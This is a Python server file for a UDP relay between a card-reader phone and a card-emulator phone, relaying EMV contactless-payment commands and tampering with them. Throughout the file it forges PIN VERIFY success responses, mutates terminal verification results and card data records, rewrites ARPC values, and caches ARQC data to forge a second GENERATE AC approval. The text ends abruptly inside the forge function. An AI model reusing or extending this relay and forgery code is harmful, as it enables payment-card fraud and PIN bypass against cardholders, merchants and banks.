# -*- coding: utf-8 -*-
# server.py
# -*- coding: utf-8 -*-
"""RelayServer - UDP relay with EMV mutations, forge, HMAC auth, rate limiting.
   Guard phase machine wired into every mutation/forge/intercept path."""

from __future__ import annotations
import os
import socket
import struct
import json
import base64
import ipaddress
import signal
import time
import hashlib
import hmac as _hmac_mod
from threading import Lock
from typing import Optional, Tuple, Dict, Any

from constants import (
    SID_REGISTER, SID_CAPDU, SID_RAPDU, SID_ACK, SID_HEARTBEAT, SID_CTRL,
    EXCHANGE_MAGIC, APDU_INS, INS_SELECT, INS_GENERATE_AC, INS_GET_PROCESSING_OPTIONS,
    INS_READ_RECORD, INS_VERIFY, INS_EXTERNAL_AUTHENTICATE,
    SW_9000, SW_6F00, PEER_TIMEOUT_SECONDS, SOCKET_TIMEOUT, STALL_WARN_SECONDS,
    MAX_FRAME_SIZE, MAX_FRAME_PAYLOAD, CTRL_CHUNK_RAW_SIZE, RECV_BUFFER,
    CTRL_HMAC_KEY, CTRL_HMAC_DIGEST_SIZE,
    BRAND_UNKNOWN, identify_brand_from_aid, is_ppse_or_pse,
    extract_aid_from_select, detect_gpo_template,
    is_verify_apdu, is_generate_ac, is_gpo, is_select, is_external_auth,
    gac_p1, gac_p1_name, build_frame, parse_frame,
    build_exchange_payload, parse_exchange_payload,
)
from emv import (
    SessionState, ArqcCache,
    extract_arqc_from_rapdu, cid_indicates_arqc,
    craft_verify_success_bytes, fix_gac_response_length,
)
from mutations import (
    mutate_gpo_response, mutate_read_record_response,
    mutate_tvr_in_generate_ac, rewrite_arpc_in_capdu,
    forge_2nd_gac, FORGE_DISPATCH,
)
from logger import configure_logging, _record_apdu, get_apdu_history
from guard import Guard, Phase

import logging
log = logging.getLogger("RelayServer")

class RelayServer:

    SESSION_BEGIN_RATE_LIMIT = 1.0
    SESSION_BEGIN_BURST = 3

    def __init__(self, host: str = "0.0.0.0", port: int = 5566):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.running = False
        self._shutdown_requested = False

        self.reader_addr: Optional[Tuple[str, int]] = None
        self.emulator_addr: Optional[Tuple[str, int]] = None
        self.reader_last_seen: float = 0.0
        self.emulator_last_seen: float = 0.0
        self.active_epoch: int = 0
        self._incoming_epoch: int = 0
        self._session_requests: Dict[Tuple[Tuple[str, int], str], int] = {}
        self._peer_versions: Dict[Tuple[str, int], int] = {}
        # A UDP source port is not a stable client identity: Android/NAT may
        # rebind it whenever the socket or tunnel is recreated.  Keep the
        # optional registration identity separately so a genuine reconnect
        # can reclaim its role without allowing an unrelated peer to do so.
        self.reader_id: Optional[str] = None
        self.emulator_id: Optional[str] = None
        self._session_begin_timestamps: Dict[Tuple[str, int], float] = {}

        self.state = SessionState()
        self.guard = Guard()
        self.lock = Lock()

        self._packet_router = None
        try:
            import packet_router
            self._packet_router = packet_router
        except ImportError:
            pass

    def start(self) -> None:
        if self.running:
            raise RuntimeError("RelayServer is already running")
        configure_logging()
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.settimeout(SOCKET_TIMEOUT)
            self.running = True
            self._sync_router_transport()
            log.info(f"RelayServer listening on {self.host}:{self.port}")
            log.info(f"VERIFY bypass:  {'ENABLED' if self.state.verify_bypass_enabled else 'DISABLED'}")
            log.info(f"ARPC forge:     {'ENABLED' if self.state.arpc_forge_enabled else 'DISABLED'}")
            log.info(f"ARPC rewrite:   {'ENABLED' if self.state.arpc_rewrite_enabled else 'DISABLED'}")
            log.info(f"TVR mutation:   {'ENABLED' if self.state.tvr_mutation_enabled else 'DISABLED'}")
            log.info(f"CTRL HMAC auth: {'ENABLED' if CTRL_HMAC_KEY else 'DISABLED (set RELAY_CTRL_HMAC_KEY)'}")
            log.info(f"Guard phase:    {self.guard.phase.name}")
            timeout_label = (f"{PEER_TIMEOUT_SECONDS:g}s"
                             if PEER_TIMEOUT_SECONDS > 0 else "DISABLED")
            log.info(f"Peer timeout:   {timeout_label}")
            self._log_connected_devices("startup")
            self._run_loop()
        finally:
            self.stop()

    def stop(self) -> None:
        was_active = self.running or self.sock is not None
        self.running = False
        if self.sock:
            for peer in (self.reader_addr, self.emulator_addr):
                if peer:
                    self._send_ctrl_response(peer, "SERVER_SHUTDOWN")
        sock, self.sock = self.sock, None
        if sock:
            try:
                sock.close()
            except OSError as e:
                log.debug(f"Socket close failed: {e}")
        self._sync_router_transport()
        if was_active:
            log.info("RelayServer stopped")

    def _sync_router_transport(self) -> None:
        if self._packet_router:
            self._packet_router.set_transport_state(
                sock=self.sock,
                reader_addr=self.reader_addr,
                emulator_addr=self.emulator_addr,
            )

    @staticmethod
    def _device_label(addr: Optional[Tuple[str, int]], client_id: Optional[str]) -> str:
        if addr is None:
            return "DISCONNECTED"
        return f"CONNECTED {addr[0]}:{addr[1]} id={client_id or 'legacy'}"

    def _log_connected_devices(self, reason: str) -> None:
        log.info(
            "DEVICES [%s] reader=%s | emulator=%s",
            reason,
            self._device_label(self.reader_addr, self.reader_id),
            self._device_label(self.emulator_addr, self.emulator_id),
        )

    def _reset_session(self, reason: str) -> None:
        with self.lock:
            self.state.reset()
            self.guard.reset()
            if self._packet_router:
                try:
                    self._packet_router.reset_session()
                except Exception as e:
                    log.debug(f"packet_router.reset_session failed: {e}")
        log.info(f"Session reset ({reason}) - seq={self.state.seq} guard={self.guard.phase.name}")

    def _run_loop(self) -> None:
        last_activity = time.time()
        stall_warned = False

        while self.running:
            if self._shutdown_requested:
                log.info("Shutdown flag set, exiting run loop")
                self.running = False
                break

            try:
                data, addr = self.sock.recvfrom(RECV_BUFFER)
                last_activity = time.time()
                stall_warned = False

                try:
                    self._handle_packet(data, addr)
                except Exception as e:
                    log.error(f"Packet handler failed for {addr}: {e}", exc_info=True)

            except socket.timeout:
                if self._shutdown_requested:
                    log.info("Shutdown flag set during timeout, exiting")
                    self.running = False
                    break

                if self.state.selected_aid is not None:
                    elapsed = time.time() - last_activity
                    if elapsed > STALL_WARN_SECONDS and not stall_warned:
                        log.warning(
                            f"[STALL] No APDU activity for {elapsed:.1f}s "
                            f"(brand={self.state.brand}, "
                            f"second_ae_pending={self.state.second_ae_pending}, "
                            f"reason={self.state.second_ae_reason})"
                        )
                        stall_warned = True

                self._check_peer_timeouts()
                continue

            except OSError as e:
                if self.running:
                    log.error(f"Socket error: {e}")
                break

    def _check_peer_timeouts(self) -> None:
        if PEER_TIMEOUT_SECONDS <= 0:
            return
        now = time.time()
        reset_reason = None
        membership_changed = False

        if self.reader_addr and (now - self.reader_last_seen) > PEER_TIMEOUT_SECONDS:
            log.warning(f"Reader {self.reader_addr} timed out")
            self._peer_versions.pop(self.reader_addr, None)
            self.reader_addr = None
            self.reader_id = None
            reset_reason = "reader timeout"
            membership_changed = True

        if self.emulator_addr and (now - self.emulator_last_seen) > PEER_TIMEOUT_SECONDS:
            log.warning(f"Emulator {self.emulator_addr} timed out")
            self._peer_versions.pop(self.emulator_addr, None)
            self.emulator_addr = None
            self.emulator_id = None
            reset_reason = "emulator timeout"
            membership_changed = True

        if reset_reason:
            self._reset_session(reset_reason)
        if membership_changed:
            self._log_connected_devices("peer timeout")

        stale = [addr for addr in self._peer_versions
                 if addr != self.reader_addr and addr != self.emulator_addr]
        for addr in stale:
            del self._peer_versions[addr]

        self._sync_router_transport()

    def _touch_peer(self, addr: Tuple[str, int]) -> None:
        now = time.time()
        if addr == self.reader_addr:
            self.reader_last_seen = now
        elif addr == self.emulator_addr:
            self.emulator_last_seen = now

    def _send_frame(self, addr: Tuple[str, int], sid: int, payload: bytes) -> bool:
        seq = 0
        if sid in (SID_CAPDU, SID_RAPDU):
            exchange_id, payload = parse_exchange_payload(payload)
            if exchange_id is not None:
                seq = exchange_id
        frame = build_frame(sid, payload, seq, self.active_epoch)
        if len(frame) > MAX_FRAME_SIZE:
            log.warning(f"Frame to {addr} rejected: {len(frame)} > {MAX_FRAME_SIZE}")
            return False
        try:
            self.sock.sendto(frame, addr)
            return True
        except OSError as e:
            log.warning(f"Send to {addr} failed: {e}")
            return False

    def _send_ack(self, addr: Tuple[str, int], kind: str) -> None:
        self._send_frame(addr, SID_ACK, kind.encode("ascii"))

    def _send_ctrl_response(self, addr: Tuple[str, int], text: str) -> None:
        self._send_ctrl_bytes(addr, text.encode("utf-8"))

    def _send_ctrl_bytes(self, addr: Tuple[str, int], payload: bytes) -> None:
        if len(payload) <= MAX_FRAME_PAYLOAD:
            self._send_frame(addr, SID_CTRL, payload)
            return
        request_id = f"{time.time_ns():x}"
        chunks = [payload[i:i + CTRL_CHUNK_RAW_SIZE]
                  for i in range(0, len(payload), CTRL_CHUNK_RAW_SIZE)]
        total = len(chunks)
        for index, chunk in enumerate(chunks, 1):
            encoded = base64.b64encode(chunk)
            header = f"CHUNK {request_id} {index} {total} ".encode("ascii")
            self._send_frame(addr, SID_CTRL, header + encoded)

    @staticmethod
    def _ctrl_compute_hmac(epoch: int, seq: int, payload: bytes) -> bytes:
        if CTRL_HMAC_KEY is None:
            return b""
        msg = struct.pack(">IH", epoch & 0xFFFFFFFF, seq & 0xFFFF) + payload
        return _hmac_mod.new(CTRL_HMAC_KEY, msg, hashlib.sha256).digest()

    def _ctrl_verify_hmac(self, payload: bytes, epoch: int, seq: int) -> Tuple[bytes, bool]:
        if CTRL_HMAC_KEY is None:
            return payload, True
        if len(payload) < CTRL_HMAC_DIGEST_SIZE:
            return payload, False
        body = payload[:-CTRL_HMAC_DIGEST_SIZE]
        received_mac = payload[-CTRL_HMAC_DIGEST_SIZE:]
        expected_mac = self._ctrl_compute_hmac(epoch, seq, body)
        if _hmac_mod.compare_digest(received_mac, expected_mac):
            return body, True
        return body, False

    def _handle_packet(self, data: bytes, addr: Tuple[str, int]) -> None:
        if not self._addr_allowed(addr):
            log.warning(f"Packet rejected by CIDR policy from {addr}")
            return

        parsed = parse_frame(data)
        if parsed is None:
            log.debug(f"Malformed frame from {addr}: {data[:16].hex()}...")
            return

        sid, epoch, seq, payload = parsed
        self._incoming_epoch = epoch
        if sid in (SID_CAPDU, SID_RAPDU):
            if self.active_epoch == 0 or epoch != self.active_epoch:
                log.warning(f"Stale/uninitialized epoch from {addr}: got={epoch} active={self.active_epoch}")
                self._send_ctrl_response(addr, f"ERR STALE_EPOCH ACTIVE={self.active_epoch}")
                return
            payload = build_exchange_payload(seq, payload)

        self._touch_peer(addr)

        handlers = {
            SID_REGISTER:  self._handle_register,
            SID_CAPDU:     self._handle_capdu,
            SID_RAPDU:     self._handle_rapdu,
            SID_HEARTBEAT: self._handle_heartbeat,
            SID_CTRL:      self._handle_ctrl,
        }
        handler = handlers.get(sid)
        if handler is None:
            log.debug(f"Unhandled SID 0x{sid:02X} from {addr}")
            return
        handler(payload, addr)

    @staticmethod
    def _addr_allowed(addr: Tuple[str, int]) -> bool:
        from constants import ALLOWED_CIDRS
        if not ALLOWED_CIDRS:
            return True
        try:
            source = ipaddress.ip_address(addr[0])
            return any(source in network for network in ALLOWED_CIDRS)
        except ValueError:
            return False

    def _handle_register(self, payload: bytes, addr: Tuple[str, int]) -> None:
        registration = payload.decode("utf-8", errors="replace").strip()
        parts = registration.split()
        mode = parts[0].upper() if parts else ""
        version = None
        client_id = None
        if len(parts) > 1 and parts[1].upper().startswith("V"):
            try:
                version = int(parts[1][1:])
            except ValueError:
                version = None

        for part in parts[2:]:
            if part.upper().startswith("ID="):
                candidate = part[3:]
                # Keep IDs log-safe and bounded. UUID-derived Java IDs fit
                # comfortably; malformed IDs simply use legacy semantics.
                if candidate and len(candidate) <= 64 and all(
                        char.isalnum() or char in "-_" for char in candidate):
                    client_id = candidate
                break

        log.info(f"REGISTER from {addr}: mode={mode} version={version or 'legacy'} "
                 f"client_id={client_id or 'legacy'}")
        from constants import PROTOCOL_VERSION, REQUIRE_PROTOCOL_VERSION
        if REQUIRE_PROTOCOL_VERSION and version != PROTOCOL_VERSION:
            self._send_ctrl_response(addr, f"ERR PROTOCOL_VERSION REQUIRED={PROTOCOL_VERSION}")
            return
        if version is not None and version != PROTOCOL_VERSION:
            self._send_ctrl_response(addr, f"ERR PROTOCOL_VERSION REQUIRED={PROTOCOL_VERSION}")
            return
        if mode == "READER":
            if self.reader_addr is not None and self.reader_addr != addr:
                upgrading_legacy = self.reader_id is None and client_id is not None
                if not upgrading_legacy and (client_id is None or client_id != self.reader_id):
                    log.warning(f"REGISTER rejected for {addr}: reader slot occupied by "
                                f"{self.reader_addr} id={self.reader_id or 'legacy'}")
                    self._send_ctrl_response(addr, "ERR ROLE_OCCUPIED READER")
                    return
                old_addr = self.reader_addr
                self._peer_versions.pop(old_addr, None)
                action = "legacy upgraded" if upgrading_legacy else "address rebound"
                log.info(f"Reader {action}: {old_addr} -> {addr} client_id={client_id}")
                self._reset_session(f"reader {action}")
            
            self.reader_addr = addr
            self.reader_id = client_id
            self.reader_last_seen = time.time()
            self._peer_versions[addr] = version or 0
            self._send_ack(addr, "REGISTER")
            log.info(f"DEVICE CONNECTED role=READER address={addr[0]}:{addr[1]} "
                     f"id={client_id or 'legacy'} protocol=V{version or 0}")
            self._log_connected_devices("reader registered")

        elif mode == "EMULATOR":
            if self.emulator_addr is not None and self.emulator_addr != addr:
                upgrading_legacy = self.emulator_id is None and client_id is not None
                if not upgrading_legacy and (client_id is None or client_id != self.emulator_id):
                    log.warning(f"REGISTER rejected for {addr}: emulator slot occupied by "
                                f"{self.emulator_addr} id={self.emulator_id or 'legacy'}")
                    self._send_ctrl_response(addr, "ERR ROLE_OCCUPIED EMULATOR")
                    return
                old_addr = self.emulator_addr
                self._peer_versions.pop(old_addr, None)
                action = "legacy upgraded" if upgrading_legacy else "address rebound"
                log.info(f"Emulator {action}: {old_addr} -> {addr} client_id={client_id}")
                self._reset_session(f"emulator {action}")
            
            self.emulator_addr = addr
            self.emulator_id = client_id
            self.emulator_last_seen = time.time()
            self._peer_versions[addr] = version or 0
            self._send_ack(addr, "REGISTER")
            log.info(f"DEVICE CONNECTED role=EMULATOR address={addr[0]}:{addr[1]} "
                     f"id={client_id or 'legacy'} protocol=V{version or 0}")
            self._log_connected_devices("emulator registered")

        elif mode == "DEREGISTER":
            peer_removed = False
            removed_roles = []
            if addr == self.reader_addr:
                self.reader_addr = None
                self.reader_id = None
                peer_removed = True
                removed_roles.append("READER")
            if addr == self.emulator_addr:
                self.emulator_addr = None
                self.emulator_id = None
                peer_removed = True
                removed_roles.append("EMULATOR")
            if peer_removed:
                self._reset_session("peer deregistered")
                log.info(f"DEVICE DISCONNECTED role={'+'.join(removed_roles)} "
                         f"address={addr[0]}:{addr[1]} reason=deregistered")
                self._log_connected_devices("peer deregistered")
            self._peer_versions.pop(addr, None)
            self._send_ack(addr, "DEREGISTER")

        else:
            log.warning(f"Unknown REGISTER mode: {mode!r}")
            return

        self._sync_router_transport()

    def _identify_source(self, addr: Tuple[str, int]) -> Tuple[Optional[Tuple[str, int]], str, str]:
        if addr == self.emulator_addr:
            return self.reader_addr, "EMULATOR", "READER"
        if addr == self.reader_addr:
            return self.emulator_addr, "READER", "EMULATOR"
        return None, "?", "?"

    def _guard_router_mutation(self, direction: str, ins: Optional[int]) -> Tuple[bool, str]:
        """Fail-closed gateway for optional packet-router mutation modes."""
        if ins is None:
            return False, "packet-router mutation has no APDU instruction"
        if direction == "capdu":
            if ins == INS_VERIFY:
                return self.guard.check_intercept(ins, self.state)
            if ins == INS_EXTERNAL_AUTHENTICATE:
                return self.guard.check_intercept(ins, self.state)
            if ins == INS_GENERATE_AC:
                return self.guard.check_mutation(ins, self.state)
        elif direction == "rapdu" and ins in (INS_GET_PROCESSING_OPTIONS, INS_READ_RECORD):
            return self.guard.check_mutation(ins, self.state)
        return False, (
            f"packet-router {direction} mutation not defined for INS 0x{ins:02X}"
        )

    def _handle_capdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        exchange_id, payload = parse_exchange_payload(payload)
        target, source_name, target_name = self._identify_source(addr)
        if source_name == "?":
            log.warning(f"CAPDU from unknown address {addr}")
            return
        if source_name != "EMULATOR":
            log.warning(f"Protocol violation: CAPDU from {source_name}")
            return

        with self.lock:
            pending_id = self.state.pending_exchange_id
            pending_capdu = self.state.pending_capdu
        if pending_id is not None:
            if exchange_id == pending_id and payload == pending_capdu:
                log.info(f"Duplicate CAPDU exchange={exchange_id} acknowledged without re-forwarding")
                self._send_ack(addr, f"CAPDU {exchange_id}")
            else:
                log.warning(f"Overlapping CAPDU rejected: got={exchange_id} pending={pending_id}")
                self._send_ctrl_response(addr, f"ERR APDU_BUSY ACTIVE={pending_id}")
            return

        if self.state.verify_bypass_enabled and is_verify_apdu(payload):
            allowed, reason = self.guard.check_intercept(INS_VERIFY, self.state)
            if not allowed:
                log.warning(f"[GUARD] VERIFY bypass blocked: {reason}")
            else:
                with self.lock:
                    self.state.verify_bypass_count += 1
                    count = self.state.verify_bypass_count
                pin_len = payload[4] if len(payload) > 4 else 0
                _record_apdu("EMU>RDR", "CAPDU", "VERIFY", payload,
                             note=f"INTERCEPTED (bypass #{count}, PIN Lc={pin_len})")
                log.info(f"[VERIFY-BYPASS #{count}] Intercepted VERIFY (Lc={pin_len}) -> 9000 "
                         f"[guard={self.guard.phase.name}]")
                fake_resp = craft_verify_success_bytes()
                _record_apdu("FORGE>EMU", "RAPDU", "VERIFY-FORGE", fake_resp,
                             note="forged 9000")
                self._send_frame(self.emulator_addr, SID_RAPDU,
                                 build_exchange_payload(exchange_id, fake_resp))
                return

        if not target:
            log.warning(f"CAPDU from {source_name} dropped: {target_name} not registered")
            return

        if (self.state.arpc_rewrite_enabled
                and (is_external_auth(payload) or is_generate_ac(payload))):
            ins_byte = payload[APDU_INS] if len(payload) > APDU_INS else 0
            allowed, reason = self.guard.check_intercept(ins_byte, self.state)
            if not allowed:
                log.debug(f"[GUARD] ARPC rewrite skipped: {reason}")
            else:
                try:
                    rewritten, note = rewrite_arpc_in_capdu(payload)
                    if note is not None:
                        with self.lock:
                            self.state.arpc_rewrite_count += 1
                            count = self.state.arpc_rewrite_count
                        from constants import INS_MAP
                        _record_apdu("EMU>RDR", "CAPDU",
                                     INS_MAP.get(ins_byte, "?"),
                                     rewritten, note=f"REWRITE #{count}: {note}")
                        payload = rewritten
                except Exception as e:
                    log.error(f"[ARPC-REWRITE CRASH] {type(e).__name__}: {e}", exc_info=True)

        if self.state.tvr_mutation_enabled and is_generate_ac(payload):
            allowed, reason = self.guard.check_mutation(INS_GENERATE_AC, self.state)
            if not allowed:
                log.debug(f"[GUARD] TVR mutation skipped: {reason}")
            else:
                try:
                    mutated, note = mutate_tvr_in_generate_ac(payload)
                    if note is not None:
                        with self.lock:
                            self.state.tvr_mutation_count += 1
                            count = self.state.tvr_mutation_count
                        _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC", mutated,
                                     note=f"TVR-MUTATE #{count}: {note}")
                        payload = mutated
                except Exception as e:
                    log.error(f"[TVR-MUTATE CRASH] {type(e).__name__}: {e}", exc_info=True)

        if (self._packet_router
                and self._packet_router.get_mode() != self._packet_router.MODE_PASSTHROUGH):
            ins_byte = payload[APDU_INS] if len(payload) > APDU_INS else None
            allowed, reason = self._guard_router_mutation("capdu", ins_byte)
            if not allowed:
                log.warning(f"[GUARD] packet-router CAPDU mutation blocked: {reason}")
            else:
                try:
                    payload = self._packet_router.apply_mitm(
                        "capdu", payload, self._packet_router.session, log
                    )
                except Exception as e:
                    log.error(f"packet_router.apply_mitm failed: {e}")

        if (self.state.arpc_forge_enabled
                and self.state.second_ae_pending
                and is_generate_ac(payload)):
            allowed, reason = self.guard.check_forge(self.state)
            if not allowed:
                log.warning(f"[GUARD] Forge blocked: {reason} -> forwarding to reader instead")
            else:
                try:
                    with self.lock:
                        self.state.pending_capdu = payload
                        self.state.pending_exchange_id = exchange_id
                    _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC (2nd)", payload,
                                 note=f"INTERCEPTED for forge (brand={self.state.brand})")
                    self._handle_second_gac_forge(payload)
                except Exception as e:
                    log.error(f"[ARPC-FORGE CRASH] {type(e).__name__}: {e}", exc_info=True)
                    self._send_frame(self.emulator_addr, SID_RAPDU,
                                     build_exchange_payload(exchange_id, SW_6F00))
                    with self.lock:
                        self.state.second_ae_pending = False
                        self.state.second_ae_reason = f"forge crashed: {e}"
                        self.state.pending_capdu = None
                        self.state.pending_exchange_id = None
                return

        if self._packet_router:
            try:
                self._packet_router.classify_and_cache(payload)
            except Exception as e:
                log.debug(f"packet_router.classify_and_cache failed: {e}")

        with self.lock:
            self.state.pending_capdu = payload
            self.state.pending_exchange_id = exchange_id

        self._send_frame(target, SID_CAPDU, build_exchange_payload(exchange_id, payload))
        if exchange_id is not None:
            self._send_ack(addr, f"CAPDU {exchange_id}")
        ins_byte = payload[APDU_INS] if len(payload) > APDU_INS else None
        from constants import INS_MAP
        ins_name = INS_MAP.get(ins_byte, f"0x{ins_byte:02X}" if ins_byte is not None else "??")
        _record_apdu(f"{source_name[:3]}>{target_name[:3]}", "CAPDU", ins_name, payload)
        log.info(f"CAPDU {ins_name} {source_name} > {target_name} [guard={self.guard.phase.name}]")

    def _handle_rapdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        exchange_id, payload = parse_exchange_payload(payload)
        target, source_name, target_name = self._identify_source(addr)
        if source_name == "?":
            log.warning(f"RAPDU from unknown address {addr}")
            return
        if source_name != "READER":
            log.warning(f"Protocol violation: RAPDU from {source_name}")
            return
        if not target:
            log.warning(f"RAPDU from {source_name} dropped: {target_name} not registered")
            return
        expected_id = self.state.pending_exchange_id
        if expected_id is None and self.state.pending_capdu is None:
            log.warning(f"Unsolicited/duplicate RAPDU rejected: exchange={exchange_id}")
            return
        if exchange_id is not None and expected_id is not None and exchange_id != expected_id:
            log.warning(f"RAPDU exchange mismatch: got={exchange_id} expected={expected_id}")
            return

        pending = self.state.pending_capdu
        if pending and len(pending) > APDU_INS and pending[APDU_INS] == INS_GENERATE_AC:
            fixed_payload, fix_note = fix_gac_response_length(payload)
            if fix_note:
                log.info(f"[GAC-LENGTH-FIX] {fix_note}")
                _record_apdu("RDR>FIX", "RAPDU", "GENERATE AC", fixed_payload,
                             note=f"LENGTH-FIX: {fix_note}")
                payload = fixed_payload

        sw = payload[-2:] if len(payload) >= 2 else b""
        phase_before = self.guard.phase
        self.guard.record_sw(sw)

        phase_advanced = False
        if pending and len(pending) > 1:
            ins = pending[APDU_INS]
            if ins == INS_SELECT:
                aid = extract_aid_from_select(pending)
                if aid and is_ppse_or_pse(aid):
                    ok, reason = self.guard.advance(Phase.PPSE_SELECTED)
                    if ok: log.debug(f"[GUARD] {reason}")
                    else: log.debug(f"[GUARD] PPSE advance skipped: {reason}")
                elif aid:
                    ok, reason = self.guard.advance(Phase.AID_SELECTED)
                    if ok:
                        brand = identify_brand_from_aid(aid)
                        with self.lock:
                            self.state.selected_aid = aid
                            self.state.brand = brand
                        log.info(f"AID selected: {aid.hex().upper()} -> brand={brand}")
                        log.debug(f"[GUARD] {reason}")
                    else: log.debug(f"[GUARD] AID advance skipped: {reason}")
            elif ins == INS_GET_PROCESSING_OPTIONS:
                ok, reason = self.guard.advance(Phase.GPO_RESPONDED)
                phase_advanced = ok
                if ok: log.debug(f"[GUARD] {reason}")
                else: log.debug(f"[GUARD] GPO advance skipped: {reason}")
            elif ins == INS_READ_RECORD:
                ok, reason = self.guard.advance(Phase.READ_RECORD_DONE)
                phase_advanced = ok
                if ok: log.debug(f"[GUARD] {reason}")
                else: log.debug(f"[GUARD] READ_RECORD advance skipped: {reason}")
            elif ins == INS_GENERATE_AC:
                if phase_before == Phase.READ_RECORD_DONE:
                    ok, reason = self.guard.advance(Phase.FIRST_GAC_SENT)
                    phase_advanced = ok
                    if ok: log.debug(f"[GUARD] {reason}")
                    else: log.debug(f"[GUARD] first GAC advance skipped: {reason}")
                elif phase_before in (Phase.ARQC_RECEIVED, Phase.EXTERNAL_AUTH_DONE):
                    ok, reason = self.guard.advance(Phase.COMPLETE)
                    phase_advanced = ok
                    if ok: log.debug(f"[GUARD] {reason}")
                    else: log.debug(f"[GUARD] second GAC advance skipped: {reason}")
            elif ins == INS_EXTERNAL_AUTHENTICATE:
                ok, reason = self.guard.advance(Phase.EXTERNAL_AUTH_DONE)
                phase_advanced = ok
                if ok: log.debug(f"[GUARD] {reason}")
                else: log.debug(f"[GUARD] EXTERNAL AUTH advance skipped: {reason}")

        if pending and len(pending) > APDU_INS:
            pending_ins = pending[APDU_INS]
            if pending_ins == INS_GET_PROCESSING_OPTIONS and phase_advanced:
                self._observe_reader_rapdu(payload)
            elif pending_ins == INS_GENERATE_AC and phase_before == Phase.READ_RECORD_DONE and phase_advanced:
                self._observe_reader_rapdu(payload)

        if (self._packet_router
                and self._packet_router.get_mode() != self._packet_router.MODE_PASSTHROUGH):
            pending_ins = pending[APDU_INS] if pending and len(pending) > APDU_INS else None
            allowed, reason = self._guard_router_mutation("rapdu", pending_ins)
            if pending_ins in (INS_GET_PROCESSING_OPTIONS, INS_READ_RECORD) and not phase_advanced:
                allowed = False
                reason = "response did not complete a legal successful phase transition"
            if not allowed:
                log.warning(f"[GUARD] packet-router RAPDU mutation blocked: {reason}")
            else:
                try:
                    self._packet_router.set_last_capdu_to_emulator(self.state.pending_capdu)
                    payload = self._packet_router.apply_mitm(
                        "rapdu", payload, self._packet_router.session, log
                    )
                except Exception as e:
                    log.error(f"packet_router.apply_mitm failed: {e}")
 
        if self.state.tvr_mutation_enabled:
            pending_ins = pending[APDU_INS] if pending and len(pending) > APDU_INS else None
            if pending_ins == INS_GET_PROCESSING_OPTIONS:
                allowed, reason = self.guard.check_mutation(INS_GET_PROCESSING_OPTIONS, self.state)
                if not phase_advanced:
                    allowed = False
                    reason = "GPO response did not complete a legal successful phase transition"
                if not allowed:
                    log.debug(f"[GUARD] GPO mutation blocked: {reason}")
                else:
                    try:
                        payload = mutate_gpo_response(payload)
                    except Exception as e:
                        log.error(f"[AIP-MUTATE CRASH] {type(e).__name__}: {e}", exc_info=True)
            elif pending_ins == INS_READ_RECORD:
                allowed, reason = self.guard.check_mutation(INS_READ_RECORD, self.state)
                if not phase_advanced:
                    allowed = False
                    reason = "READ RECORD response did not complete a legal successful phase transition"
                if not allowed:
                    log.debug(f"[GUARD] READ RECORD mutation blocked: {reason}")
                else:
                    try:
                        payload = mutate_read_record_response(payload)
                    except Exception as e:
                        log.error(f"[CVM-MUTATE CRASH] {type(e).__name__}: {e}", exc_info=True)

        response_id = exchange_id if exchange_id is not None else expected_id
        self._send_frame(target, SID_RAPDU, build_exchange_payload(response_id, payload))
        if response_id is not None:
            self._send_ack(addr, f"RAPDU {response_id}")

        sw_hex = f"{payload[-2]:02X}{payload[-1]:02X}" if len(payload) >= 2 else "??"
        pending_ins = (self.state.pending_capdu[APDU_INS]
                       if self.state.pending_capdu and len(self.state.pending_capdu) > APDU_INS
                       else None)
        from constants import INS_MAP
        pending_ins_name = INS_MAP.get(pending_ins, "?") if pending_ins is not None else "?"
        _record_apdu(f"{source_name[:3]}>{target_name[:3]}", "RAPDU",
                     pending_ins_name, payload, note=f"SW={sw_hex}")
        log.info(f"RAPDU sw={sw_hex} {source_name} > {target_name} [guard={self.guard.phase.name}]")
        with self.lock:
            self.state.pending_capdu = None
            self.state.pending_exchange_id = None

    def _observe_reader_rapdu(self, payload: bytes) -> None:
        pending = self.state.pending_capdu
        if not pending or len(pending) < 2:
            return
        ins = pending[APDU_INS]

        if ins == INS_GET_PROCESSING_OPTIONS:
            template = detect_gpo_template(payload)
            with self.lock:
                self.state.gpo_template = template
            if template is not None:
                log.info(f"GPO template cached: 0x{template:02X}")
            else:
                log.warning("GPO response used unknown template - 2nd GAC forge may fail")
            return

        if ins == INS_GENERATE_AC:
            cache = extract_arqc_from_rapdu(payload, self.state.gpo_template)
            if cache.template is None:
                cache.template = self.state.gpo_template

            is_arqc, reason = cid_indicates_arqc(cache, payload)

            for note in cache.parse_notes:
                log.debug(f"[GAC-PARSE] {note}")

            arqc_phase_accepted = False
            armed = False
            if is_arqc:
                ok, guard_reason = self.guard.advance(Phase.ARQC_RECEIVED)
                if ok:
                    arqc_phase_accepted = True
                    armed = cache.is_complete()
                    if not armed:
                        reason = f"{reason}; ARQC cache incomplete"
                    log.debug(f"[GUARD] {guard_reason}")
                else:
                    log.warning(f"[GUARD] ARQC phase advance failed: {guard_reason}")
                    reason = f"{reason}; guard rejected: {guard_reason}"

            with self.lock:
                self.state.arqc_cache = cache
                self.state.second_ae_pending = armed
                self.state.second_ae_reason = reason
                self.state.gac_response_count += 1

            if arqc_phase_accepted:
                tmpl_str = f"0x{cache.template:02X}" if cache.template else "None"
                atc_str = cache.atc.hex() if cache.atc else "??"
                ac_str = cache.ac.hex() if cache.ac else "??"
                log.info(
                    f"[ARQC-CACHED] template={tmpl_str} brand={self.state.brand} "
                    f"ATC={atc_str} AC={ac_str} reason='{reason}' "
                    f"-> 2nd GAC forge {'ARMED' if armed else 'NOT ARMED'} "
                    f"[guard={self.guard.phase.name}]"
                )
            elif not is_arqc:
                log.warning(
                    f"[NO-ARQC] 2nd GAC forge NOT armed. Reason: {reason}. "
                    f"Parse notes: {'; '.join(cache.parse_notes)}"
                )
                ok, guard_reason = self.guard.advance(Phase.COMPLETE)
                if ok:
                    log.debug(f"[GUARD] {guard_reason}")
                else:
                    log.warning(f"[GUARD] terminal GAC advance failed: {guard_reason}")

    def _handle_second_gac_forge(self, capdu: bytes) -> None:
        cache = self.state.arqc_cache
        p1 = gac_p1(capdu)
        brand = self.state.brand
        forced_cid = 0x40  # CID_TC

